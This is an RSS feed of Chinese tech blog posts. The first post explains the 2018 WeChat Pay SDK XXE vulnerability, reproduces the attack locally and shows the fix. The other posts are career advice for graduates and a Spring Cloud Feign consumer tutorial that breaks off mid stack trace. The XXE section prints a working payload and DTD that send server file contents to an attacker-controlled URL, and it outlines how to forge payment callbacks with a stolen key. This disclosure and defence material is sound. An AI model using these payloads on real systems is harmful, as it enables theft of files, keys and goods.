<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>谈谈微信支付曝出的漏洞 - 编程迷思</title>
<link>http://www.cnblogs.com/kismetv/p/9266224.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kismetv/p/9266224.html</guid>
<description>

&lt;p&gt;昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。&lt;/p&gt;
&lt;p&gt;漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3&lt;/p&gt;

&lt;h2&gt;1.  XXE漏洞&lt;/h2&gt;
&lt;p&gt;此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。&lt;/p&gt;
&lt;p&gt;XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174710/201807/1174710-20180705012356377-1965590987.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。&lt;/p&gt;
&lt;p&gt;可以说，&lt;strong&gt;XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。&lt;/strong&gt;在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。&lt;/p&gt;
&lt;h2&gt;2.  微信支付漏洞&lt;/h2&gt;
&lt;p&gt;本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。&lt;/p&gt;
&lt;p&gt;SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip&lt;/p&gt;
&lt;p&gt;SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174710/201807/1174710-20180705012507244-1486840621.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。&lt;/p&gt;
&lt;h2&gt;3.  攻击复现&lt;/h2&gt;
&lt;p&gt;下面在本机环境下进行复现。&lt;/p&gt;
&lt;p&gt;假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。&lt;/p&gt;
&lt;p&gt;攻击时构造的请求如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174710/201807/1174710-20180705012543069-734574282.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中xml内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE root [
    &amp;lt;!ENTITY % file SYSTEM &quot;file:///etc/password&quot;&amp;gt;
    &amp;lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:9000/xxe.dtd&quot;&amp;gt;
    %xxe;
]&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&amp;lt;!ENTITY % shell &quot;&amp;lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&amp;gt;&quot;&amp;gt;
%shell;
%upload;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;通过xml+dtd文件，攻击者便可以的服务器http://127.0.0.1:9000中会收到如下请求：&lt;/p&gt;
&lt;p&gt;http://127.0.0.1:9000/evil/password1234&lt;/p&gt;
&lt;p&gt;这样，攻击者便得到了/etc/password文件的内容。&lt;/p&gt;
&lt;p&gt;在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。&lt;/p&gt;

&lt;p&gt;解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。&lt;/p&gt;
&lt;p&gt;漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174710/201807/1174710-20180705012759785-4303757.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;加入了如下两行代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
documentBuilderFactory.setExpandEntityReferences(false);
documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5&quot;&gt;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;笔者本人使用上述方案中建议的如下代码修复了该漏洞：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
……
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;1.  危害不只是“0元也能买买买”&lt;/h2&gt;
&lt;p&gt;在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。&lt;/p&gt;
&lt;p&gt;然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。&lt;/p&gt;
&lt;h2&gt;2.  漏洞不限于微信支付SDK&lt;/h2&gt;
&lt;p&gt;虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：&lt;/p&gt;
&lt;p&gt;（1）接口使用xml做请求参数&lt;/p&gt;
&lt;p&gt;（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)&lt;/p&gt;
&lt;p&gt;（3）接口中解析xml参数时，没有禁用对外部实体的访问&lt;/p&gt;
&lt;p&gt;建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。&lt;/p&gt;
&lt;h2&gt;3.  xml与json&lt;/h2&gt;
&lt;p&gt;xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。&lt;/p&gt;
&lt;h2&gt;4.  题外话：微信支付的签名认证&lt;/h2&gt;
&lt;p&gt;在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。&lt;/p&gt;
&lt;p&gt;在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。&lt;/p&gt;

&lt;p&gt;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jul/3&quot;&gt;http://seclists.org/fulldisclosure/2018/Jul/3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;https://www.cnblogs.com/tongwen/p/5194483.html&lt;/p&gt;
</description>
<pubDate>Wed, 04 Jul 2018 23:31:00 +0000</pubDate>
<dc:creator>编程迷思</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kismetv/p/9266224.html</dc:identifier>
</item>
<item>
<title>又到一年毕业季，散伙之后无少年——毕业生如何快速向社会人转换 - hsm_computer</title>
<link>http://www.cnblogs.com/JavaArchitect/p/9252095.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/JavaArchitect/p/9252095.html</guid>
<description>&lt;p&gt;    从7月份开始，14级的毕业生就开始陆续踏上社会了。@所有14级毕业生，祝前程似锦，@得到读研机会的同学，恭喜你们能再享受3年的校园生活，@15级的同学，请珍惜最后一年的美好时光。&lt;/p&gt;
&lt;h4&gt;1  校园和社会的区别&lt;/h4&gt;
&lt;p&gt;    其实最本质的区别是，在大学里，我们是花自己的钱，到社会里，我们上班后是挣别人的钱。&lt;/p&gt;
&lt;p&gt;    1 在校园里，如果得过且过，或许没人来管，但在公司里，如果因此拖累了别人的进度，那么就会有麻烦。&lt;/p&gt;
&lt;p&gt;    2 在校园里，大家的利益共同点不多，所以虽然也有勾心斗角尔虞我诈，但程度上要比社会上轻太多了。&lt;/p&gt;
&lt;p&gt;    3 在校园里，有导师来帮大家制定前进方向和学习计划，但在社会上，公司只要求你能挣钱，其它未必会管，所以毕业后，个人发展更得靠自己。&lt;/p&gt;
&lt;p&gt;    4 在校园里，我们接触的更多的是老师和学生，可以做到“谈笑无白丁”，但到了社会上，各类的人都有，而且社会上的人更多的会为自己谋利益，遇到好一点的尚能做到共赢，同时，遇到损人利己甚至恶意诈骗的，也不是没有可能。&lt;/p&gt;
&lt;p&gt;    5 在校园里，比如做课程设计或毕业课题，如果遇到问题，或不慎走错方向，导师或主动帮忙纠正，而在社会上，领导和同事未必会指出工作方式或者工作态度上等方面的问题，这样就有可能问题暴露出来前，自己可能还自我感觉良好。&lt;/p&gt;
&lt;p&gt;    总之一句话，校园里的生活是最值得回忆的，走上社会后，就得受苦受累不断打拼了，有时候，甚至就得身不由就做自己不喜欢做的事情了。&lt;/p&gt;

&lt;h4&gt;2 毕业生得尽快改变心态，转换角色&lt;/h4&gt;
&lt;p&gt;    从走出校园的那一刻起，我们就不是学生了，而是社会人了，虽然可能很不情愿，但这也是没办法的。那么在这个转变过程中，该注意哪些呢？&lt;/p&gt;
&lt;p&gt;    第一，害人之心不可有，防人之星不可无。&lt;/p&gt;
&lt;p&gt;    比如租房，又如公司给出的工资和福利，最好应该是通过合同等方式来确认，如果光靠口头，这个风险可能就得自担了。&lt;/p&gt;
&lt;p&gt;    第二，不能再得过且过，否则一定会被淘汰，最好给自己制定短期和长期的努力目标，比如n年后工资能到xx。&lt;/p&gt;
&lt;p&gt;    为什么这么说呢？因为我见过不少从学校里出来的毕业生，做事依然是用在学校里的节奏，完成工作任务时，仿佛还是在用学校里应付课程设计的那套态度和时间进度，这种人，好一点的结果是，尚能在公司里干，但工资水平低于平均，差一点的结果就是干脆找不到工作了。&lt;/p&gt;
&lt;p&gt;    第三，得尽快把书本里的知识转换成实际的本领。&lt;/p&gt;
&lt;p&gt;    从大学里能得到什么收获？不同的人有不同的回答，但有一点似乎是普遍的共识：虽然大学里有课程设计，但还是偏重于理论，而社会上的公司里，要求更多的是动手实践。&lt;/p&gt;
&lt;p&gt;    我见过个别毕业生会眼高手低，不屑于做“初级”的活，而高级的活又做不好，我见过更多的毕业生，理论知识非常扎实，说起来一套套，但动手编程开发的能力就有待提升了。&lt;/p&gt;
&lt;p&gt;    这里我不是贬低毕业生，因为我们都是从这个阶段过来的，但这却是一个普遍的现象。对此，大家一定得多运行实际代码，甚至多买点案例来分析，而且在做项目里一定得多问，多体会代码结构和关键流程，这样才能在公司里站稳。&lt;/p&gt;

&lt;h4&gt;3 毕业后一定不能怕吃苦，别怕加班&lt;/h4&gt;
&lt;p&gt;    说实在的，我也希望钱多工作少，我也不希望加班，但社会上的现实是怎么样的，大家也是心知肚明的。&lt;/p&gt;
&lt;p&gt;    在大学里，学习压力一定比不上公司里的，所以有些同学在进入公司后，见到加班就会有发自内心的抵触，能逃就逃，不能逃就出工不出力，然后在工作之余，依然像在大学里那样吃喝玩乐。    &lt;/p&gt;
&lt;p&gt;    这里我见到的情况是，毕业三年后，工资高发展好的一批人里，他们一定不怕吃苦，平时遇到加班不仅不逃避，而且会用积极的态度去面对，平时哪怕不加班，也会不断学习。所以，不得不说，加班，以及平时吃苦学习，确实能帮助我们快速成长，很多情况下，咬咬牙就坚持过来了，再回头看下，其实当时的苦真算不上什么。&lt;/p&gt;

&lt;h4&gt;4 得选择一个方向专研下去，别频繁跳槽&lt;/h4&gt;
&lt;p&gt;    这里先告诉大家一个事实，如果一个人在2年内，换了5份以上的工作，或者每份工作持续时间都不到半年，那么这个人可能连简历删选关都过不了，因为这个人或者不稳定，或者可能因为能力问题无法在公司做久。&lt;/p&gt;
&lt;p&gt;    同时，我见过不少简历，上面的条件其实不错，比如学校很好，也做了不少项目，但就跳槽多，而且在每次跳槽的理由上堂而皇之地写上“谋求更大的发展”（其实就是为了钱），很可惜，这些人没有技术面试的机会。&lt;/p&gt;
&lt;p&gt;    而且，哪怕在一家公司，大家也请找个方向专研下去，比如前端技术，测试，或者大数据分析等，别每半年换个方向，这样对积累非常不好。&lt;/p&gt;

&lt;h4&gt;5 总结下我见过的发展好的毕业生的表现&lt;/h4&gt;
&lt;p&gt;    1 作息时间合理，比如早起，至少没有放纵自己。&lt;/p&gt;
&lt;p&gt;    2 平时一定不断学习，而且会给自己定个学习规划，比如当月该学到什么程度，三个月后又该达到什么程度，而且一定得是边学边练。&lt;/p&gt;
&lt;p&gt;    3 大多数发展好的人都在大厂或者互联网公司干，虽然加班，但提升飞快。&lt;/p&gt;
&lt;p&gt;    4 哪怕本身条件一般，比如学校一般，工作和专业不是非常匹配，或个人资质一般，但很勤奋，每天会挤出足量的时间学习，或者在工作中，会用本子等方式记录下分析问题和解决问题的方式。&lt;/p&gt;
&lt;p&gt;    总之，只有把自己当成社会人，不再用大学的一套标准来评价自己，这样至少态度就好，很多情况下态度决定了能力，而能力又决定了工资。&lt;/p&gt;

&lt;h4&gt;6 本文总结：天道酬勤&lt;/h4&gt;
&lt;p&gt;    最近我自认为比较累，一方面刚进新公司，需要不断努力学习，另一方面，平时也得写书写博文然后再继续学习，但累管累，但自己体会到收获不少，在能力和钱方面，都有提升，所以我自认为，一分耕耘一分收获，这适用于所有的人。&lt;/p&gt;
&lt;p&gt;    @14级毕业生，大家在工作3年后，再回顾下，就会发现在工作开始阶段，吃的苦其实真不算什么，当后面大家钱更多的时候，需要操的心更多，如果大家在起跑线上就积极勤奋，那么升职加薪就指日可待了。&lt;/p&gt;


</description>
<pubDate>Wed, 04 Jul 2018 23:29:00 +0000</pubDate>
<dc:creator>hsm_computer</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/JavaArchitect/p/9252095.html</dc:identifier>
</item>
<item>
<title>SpringCloud学习6-如何创建一个服务消费者consumer - Ryan.Miao</title>
<link>http://www.cnblogs.com/woshimrf/p/springcloud-consumer.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/woshimrf/p/springcloud-consumer.html</guid>
<description>&lt;p&gt;上一节&lt;a href=&quot;https://www.cnblogs.com/woshimrf/p/springcloud-provider.html&quot;&gt;如何创建一个服务提供者provider&lt;/a&gt;已经启动了一个provider的server，提供用户信息查询接口。接下来，我们启动另一个provider，由于是同一台机器本地测试，我们换一个端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;--server.port=8084&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过启动传参数覆盖port。这样，我们就有两个provider实例了。接下来，可以使用我们consumer负载均衡的消费这两个provider。&lt;/p&gt;
&lt;h2 id=&quot;升级eureka依赖&quot;&gt;升级eureka依赖&lt;/h2&gt;
&lt;p&gt;eureka之前的pom依赖过期了，需要修改为&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;spring-cloud-starter-netflix-eureka-server&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同样的，所有的client都要修改为&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;创建一个consumer工程&quot;&gt;创建一个consumer工程&lt;/h2&gt;
&lt;p&gt;创建一个子模块。&lt;/p&gt;
&lt;p&gt;https://github.com/Ryan-Miao/spring-cloud-Edgware-demo/tree/master/consumer-demo&lt;/p&gt;
&lt;p&gt;配置基本和provider一致&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;dependencies&amp;gt;
    &amp;lt;!--springboot 依赖start--&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-boot-starter-actuator&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-boot-devtools&amp;lt;/artifactId&amp;gt;
      &amp;lt;optional&amp;gt;true&amp;lt;/optional&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;com.fasterxml.jackson.datatype&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;jackson-datatype-jsr310&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-cloud-starter-netflix-eureka-client&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-cloud-starter-openfeign&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-cloud-starter-netflix-ribbon&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-cloud-starter-netflix-hystrix&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;!--springboot 依赖结束--&amp;gt;


    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;springfox-swagger2&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;springfox-swagger-ui&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;


    &amp;lt;!--工具类 start--&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;com.google.guava&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;guava&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.projectlombok&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;lombok&amp;lt;/artifactId&amp;gt;
      &amp;lt;optional&amp;gt;true&amp;lt;/optional&amp;gt;
    &amp;lt;/dependency&amp;gt;

    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;net.logstash.logback&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;logstash-logback-encoder&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;!--工具类end--&amp;gt;

    &amp;lt;!--内部依赖--&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;com.test&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;provider-api&amp;lt;/artifactId&amp;gt;
      &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
    &amp;lt;/dependency&amp;gt;
    &amp;lt;!--内部依赖end--&amp;gt;

  &amp;lt;/dependencies&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; eureka客户端，负责维护注册和心跳&lt;/li&gt;
&lt;li&gt;&lt;code&gt;spring-cloud-starter-openfeign&lt;/code&gt; 声明式的HttpClient Feign客户端&lt;/li&gt;
&lt;li&gt;&lt;code&gt;spring-cloud-starter-netflix-ribbon&lt;/code&gt; 客户端负载均衡&lt;/li&gt;
&lt;li&gt;&lt;code&gt;spring-cloud-starter-netflix-hystrix&lt;/code&gt; http请求健康熔断&lt;/li&gt;
&lt;li&gt;&lt;code&gt;provider-api&lt;/code&gt; 我们定义好的provider请求的客户端&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;启动类&quot;&gt;启动类&lt;/h2&gt;
&lt;p&gt;启动类和provider相同，多了一行注解&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@EnableFeignClients
@EnableDiscoveryClient
@SpringBootApplication
public class ConsumerApplication {

    public static void main(String[] args) {
        SpringApplication.run(ConsumerApplication.class, args);
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;EnableFeignClients&lt;/code&gt; 启用Feign&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;swagger等基础配置&quot;&gt;Swagger等基础配置&lt;/h2&gt;
&lt;p&gt;同provider，提供几个简单api。省略叙述。&lt;/p&gt;
&lt;h2 id=&quot;feignclient-远程调用&quot;&gt;FeignClient 远程调用&lt;/h2&gt;
&lt;p&gt;创建一个接口，继承我们provider-api里声明的接口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@FeignClient(value = &quot;PROVIDER-DEMO&quot;, fallback = UserClientFallback.class)
public interface UserClient extends UserApi {
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;FeignClient&lt;/code&gt;会标注这是一个Feign的客户端，在项目启动的时候就会扫描到，value是连接的service的名称，这里即我们的provider, fallback则是当远程请求失败的时候，服务降级，我们来决定做什么。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如果不填写fallback，则请求遇到非200会报错，抛出一个RuntimeException, HystrixRuntimeException. 有可能是远程返回500， 400等，也有可能是连接超时，还有可能是hystrix 熔断。&lt;/p&gt;
&lt;p&gt;而填写了fallback, 则会在服务调用失败的时候，转调用我们对应的fallback方法。&lt;/p&gt;
&lt;p&gt;fallback就是实现我们这个UserClient接口。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Component
@RequestMapping(&quot;/userClientFallback&quot;)
public class UserClientFallback implements UserClient {

    @Override
    public List&amp;lt;UserVo&amp;gt; list() {
        UserVo userVo = new UserVo();
        userVo.setAge(1);
        userVo.setBirth(LocalDate.now());
        userVo.setId(1);
        userVo.setName(&quot;fallback&quot;);
        return Lists.newArrayList(userVo);
    }

    @Override
    public String fallback() {
        return &quot;访问失败后调用此方法，进行服务降级.&quot;;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;Component&lt;/code&gt;是要把这个Fallback注册到spring容器里，FeignClient在项目启动的时候会读取fallback, 然后从context里读取这个instance，如果没有找到，就启动失败、&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;见org.springframework.cloud.netflix.feign.HystrixTargeter#getFromContext&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;private &amp;lt;T&amp;gt; T getFromContext(String fallbackMechanism, String feignClientName, FeignContext context,
                                 Class&amp;lt;?&amp;gt; beanType, Class&amp;lt;T&amp;gt; targetType) {
        Object fallbackInstance = context.getInstance(feignClientName, beanType);
        if (fallbackInstance == null) {
            throw new IllegalStateException(String.format(
                &quot;No &quot; + fallbackMechanism + &quot; instance of type %s found for feign client %s&quot;,
                beanType, feignClientName));
        }

        if (!targetType.isAssignableFrom(beanType)) {
            throw new IllegalStateException(
                    String.format(
                        &quot;Incompatible &quot; + fallbackMechanism + &quot; instance. Fallback/fallbackFactory of type %s is not assignable to %s for feign client %s&quot;,
                        beanType, targetType, feignClientName));
        }
        return (T) fallbackInstance;
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;@RequestMapping&lt;/code&gt; 则是不得已而为之了。前文provider-demo里，我们把api抽取成UserApi&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;@RequestMapping(&quot;/api/v1/users&quot;)
public interface UserApi {

    @GetMapping(&quot;/&quot;)
    List&amp;lt;UserVo&amp;gt; list();

    @GetMapping(&quot;/fallback&quot;)
    String fallback();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的RequestMapping会被spring启动的到时候扫描到，在初始化RequestMappingHandlerMapping的时候，扫描所有的bean，把RequestMapping的bean给注册RequestMapping. 这时候，它不管你是不是controller的。我们FeignClient所声明的接口上有@RequestMapping，也会被扫描。而我们Fallback也继承，也会有@RequestMapping，这时候重复定义RequestMapping会报错&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'requestMappingHandlerMapping' defined in class path resource [org/springframework/boot/autoconfigure/web/WebMvcAutoConfiguration$EnableWebMvcConfiguration.class]: Invocation of init method failed; nested exception is java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'com.test.cloud.client.UserClient' method 
public abstract java.util.List&amp;lt;com.test.cloud.vo.UserVo&amp;gt; com.test.cloud.api.UserApi.list()
